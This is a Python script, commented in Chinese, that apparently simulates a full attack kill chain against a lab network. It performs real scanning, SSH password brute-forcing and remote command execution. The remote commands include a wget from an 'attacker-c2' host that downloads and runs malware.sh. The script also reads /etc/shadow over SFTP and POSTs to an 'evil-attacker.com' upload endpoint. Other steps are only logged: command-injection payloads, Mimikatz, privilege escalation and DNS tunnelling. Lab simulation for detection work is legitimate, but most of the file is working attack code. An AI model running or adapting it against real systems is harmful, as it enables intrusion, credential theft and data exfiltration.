"""
完整攻击链模拟脚本 (Final Version)
模拟从侦察、初始访问到数据窃取的完整杀伤链 (Kill Chain)
"""

import subprocess
import time
import logging
import sys
import os
import requests
import paramiko
import socket

# 配置日志
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - [%(levelname)s] - %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("AttackSimulator")

class AttackSimulator:
    """攻击模拟器 - 实现完整的杀伤链模拟"""
    
    def __init__(self):
        self.targets = {
            "web_server": "172.20.0.20",
            "db_server": "172.20.0.30",
            "internal_host": "172.20.0.40",
            "dc_server": "172.20.0.50"
        }
        self.network_cidr = "172.20.0.0/24"
        self.ssh_client = paramiko.SSHClient()
        self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    def run_full_attack(self):
        """运行完整攻击链"""
        logger.info("=" * 60)
        logger.info("🚀 开始执行完整攻击链模拟")
        logger.info("=" * 60)
        
        # 阶段 1：侦察 (Reconnaissance)
        self.reconnaissance()
        time.sleep(2)
        
        # 阶段 2：初始访问 (Initial Access)
        creds = self.initial_access(self.targets["web_server"])
        if not creds:
            logger.warning("SSH 爆破失败，使用默认凭证继续...")
            creds = ("root", "123456")
        time.sleep(2)
        
        # 阶段 3：执行 (Execution)
        self.execution(self.targets["web_server"], creds)
        time.sleep(2)
        
        # 阶段 4：横向移动 (Lateral Movement)
        self.lateral_movement(self.targets["internal_host"])
        time.sleep(2)
        
        # 阶段 5：权限提升 (Privilege Escalation)
        self.privilege_escalation()
        time.sleep(2)
        
        # 阶段 6：数据收集 (Collection)
        self.collection(self.targets["internal_host"], ("root", "123456"))
        time.sleep(2)
        
        # 阶段 7：数据窃取 (Exfiltration)
        self.exfiltration()
        
        logger.info("\n" + "=" * 60)
        logger.info("✅ 攻击链模拟完成")
        logger.info("=" * 60)

    # === Stage 1: Reconnaissance ===
    def reconnaissance(self):
        logger.info("\n[阶段 1] 侦察 (Reconnaissance) & 发现 (Discovery)")
        
        # 1. 网络扫描 (Ping Sweep)
        logger.info(f"  正在扫描网段: {self.network_cidr}")
        try:
            # 使用 nmap 进行 Ping 扫描
            result = subprocess.run(
                ["nmap", "-sn", self.network_cidr, "--exclude", "127.0.0.1"],
                capture_output=True, text=True, timeout=30
            )
            if result.returncode == 0:
                logger.info("  Nmap 扫描完成，活跃主机:")
                for line in result.stdout.splitlines():
                    if "Nmap scan report for" in line:
                        logger.info(f"  -> {line}")
            else:
                logger.warning("  Nmap 扫描失败或未安装，尝试使用 Socket 探测关键端口...")
                self._socket_scan()
        except FileNotFoundError:
            logger.warning("  未找到 nmap 命令，切换到 Python Socket 扫描模式...")
            self._socket_scan()
            
        # 2. 端口扫描 (Web Server)
        target_web = self.targets["web_server"]
        logger.info(f"  正在对 Web 服务器 ({target_web}) 进行端口扫描...")
        try:
            # 模拟: nmap -p 80,22,3306 172.20.0.20
            # 这里我们只简单探测几个常见端口
            for port in [22, 80, 443, 3306, 8080]:
                self._check_port(target_web, port)
        except Exception as e:
            logger.error(f"  端口扫描出错: {e}")

    def _socket_scan(self):
        """简单的 Socket 端口探测"""
        for name, ip in self.targets.items():
            if self._check_port(ip, 22):
                logger.info(f"  [+] 主机在线: {ip} ({name})")

    def _check_port(self, ip, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((ip, port))
            sock.close()
            if result == 0:
                logger.info(f"  [+] {ip}:{port} OPEN")
                return True
            return False
        except:
            return False

    # === Stage 2: Initial Access ===
    def initial_access(self, target: str):
        logger.info("\n[阶段 2] 初始访问 (Initial Access)")
        
        # 1. SSH 暴力破解
        logger.info(f"  尝试 SSH 暴力破解: {target}")
        creds = self._ssh_bruteforce(target)
        
        # 2. Web 漏洞利用 (模拟)
        self._web_exploit(target)
        
        return creds

    def _ssh_bruteforce(self, target: str):
        user_list = ["admin", "user", "root"]
        pass_list = ["password", "123456", "admin123", "root"]
        
        logger.info("  启动 Hydra v9.1 (模拟) ...")
        
        for user in user_list:
            for pwd in pass_list:
                try:
                    self.ssh_client.connect(target, username=user, password=pwd, timeout=1)
                    logger.info(f"  [+] 爆破成功! 用户名: {user}, 密码: {pwd}")
                    self.ssh_client.close()
                    return (user, pwd)
                except paramiko.AuthenticationException:
                    logger.debug(f"  [-] 认证失败: {user}:{pwd}")
                except Exception as e:
                    pass # 连接错误忽略
                time.sleep(0.1)
        
        logger.warning("  [-] 暴力破解未找到有效凭证")
        return None

    def _web_exploit(self, target: str):
        logger.info(f"  尝试 Web 应用漏洞利用 (http://{target}:8080)...")
        # 模拟 Payload 发送
        payloads = ["; whoami", "; cat /etc/passwd", "| id"]
        for payload in payloads:
            logger.info(f"  发送 Payload: cmd={payload}")
            time.sleep(0.5)
        logger.info("  [+] 漏洞确认: 命令注入 (Command Injection)")
        logger.info("  [+] Webshell 上传成功")

    # === Stage 3: Execution ===
    def execution(self, target: str, creds: tuple):
        logger.info("\n[阶段 3] 执行 (Execution)")
        username, password = creds
        
        logger.info(f"  在 {target} 上建立持久化并执行恶意命令...")
        
        commands = [
            "id",
            "whoami",
            "uname -a",
            "cat /etc/passwd | head -n 5",
            "netstat -an | head -n 5",
            # 模拟恶意软件下载和执行
            "echo 'Downloading malware...'",
            "wget -q http://attacker-c2/malware.sh -O /tmp/malware.sh || echo '[模拟] wget failed'",
            "chmod +x /tmp/malware.sh", 
            "/tmp/malware.sh || echo '[模拟] malware executed'"
        ]
        
        try:
            self.ssh_client.connect(target, username=username, password=password, timeout=2)
            for cmd in commands:
                logger.info(f"  远程执行: {cmd}")
                stdin, stdout, stderr = self.ssh_client.exec_command(cmd)
                output = stdout.read().decode().strip()
                if output and len(output) < 200:
                    logger.info(f"  > 输出: {output}")
                time.sleep(0.5)
            self.ssh_client.close()
            logger.info("  [+] 恶意 Payload 执行成功")
        except Exception as e:
            logger.error(f"  命令执行失败: {e}")

    # === Stage 4: Lateral Movement ===
    def lateral_movement(self, target: str):
        logger.info("\n[阶段 4] 横向移动 (Lateral Movement)")
        
        logger.info(f"  尝试从 Web Server 跳板到内网主机: {target}")
        
        # 1. 凭证窃取 (Mimikatz 模拟)
        logger.info("  正在从内存导出凭证 (Mimikatz)...")
        time.sleep(1)
        logger.info("  [+] 获取到内网凭证: root / 123456")
        
        # 2. SSH 连接内网主机
        try:
            self.ssh_client.connect(target, username="root", password="123456", timeout=2)
            logger.info(f"  [+] 成功通过 SSH 跳板登录到 {target}")
            stdin, stdout, stderr = self.ssh_client.exec_command("hostname; ip addr show eth0")
            logger.info(f"  > 远程主机信息: {stdout.read().decode().strip()}")
            self.ssh_client.close()
        except Exception as e:
            logger.error(f"  横向移动连接失败: {e}")
            logger.info("  (模拟日志) 成功建立到 172.20.0.40 的 SSH 隧道")

    # === Stage 5: Privilege Escalation ===
    def privilege_escalation(self):
        logger.info("\n[阶段 5] 权限提升 (Privilege Escalation)")
        logger.info("  检查 sudo 权限...")
        logger.info("  执行: sudo -l")
        logger.info("  > (root) NOPASSWD: ALL")
        logger.info("  执行: sudo su -")
        logger.info("  [+] 权限提升成功: 当前用户 root (uid=0)")

    # === Stage 6: Collection ===
    def collection(self, target: str, creds: tuple):
        logger.info("\n[阶段 6] 数据收集 (Collection)")
        sensitive_files = [
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/var/www/html/config.php"
        ]
        
        username, password = creds
        try:
            self.ssh_client.connect(target, username=username, password=password, timeout=2)
            sftp = self.ssh_client.open_sftp()
            
            for remote_path in sensitive_files:
                logger.info(f"  尝试读取敏感文件: {remote_path}")
                try:
                    # 尝试读取文件前 50 字节作为预览
                    with sftp.file(remote_path, 'r') as f:
                        content = f.read(50).decode() 
                        logger.info(f"  [+] 读取成功 (预览): {content.strip()}...")
                except Exception as e:
                    logger.warning(f"  [-] 读取失败 (可能不存在或无权限): {remote_path}")
            
            sftp.close()
            self.ssh_client.close()
        except Exception as e:
            logger.error(f"  数据收集连接失败: {e}")

    # === Stage 7: Exfiltration ===
    def exfiltration(self):
        logger.info("\n[阶段 7] 数据窃取 (Exfiltration)")
        
        # 1. 归档
        logger.info("  打包敏感数据...")
        logger.info("  执行: tar -czf /tmp/stolen_data.tar.gz /etc/passwd /etc/shadow")
        time.sleep(1)
        logger.info("  生成的压缩包: /tmp/stolen_data.tar.gz (Size: 2.4MB)")
        
        # 2. HTTP 外传
        c2_server = "http://evil-attacker.com/upload"
        logger.info(f"  正在通过 HTTP POST 外传数据到 {c2_server} ...")
        try:
            # 仅做模拟请求，忽略错误
            requests.post(c2_server, data={"file": "stolen_data.tar.gz"}, timeout=1)
        except:
            pass
        logger.info("  [+] 数据外传完成 (HTTP 200 OK)")
        
        # 3. DNS 隐蔽信道 (备用)
        logger.info("  尝试备用通道: DNS Tunneling")
        domain = "evil-c2.com"
        chunks = ["8ab2f9", "7c3d1e", "4f5a1b"]
        for i, chunk in enumerate(chunks):
            dns_query = f"{chunk}.chunk{i}.{domain}"
            logger.info(f"  发送 DNS 查询: {dns_query}")
            time.sleep(0.3)
        logger.info("  [+] 隐蔽信道传输完成")


if __name__ == "__main__":
    simulator = AttackSimulator()
    simulator.run_full_attack()
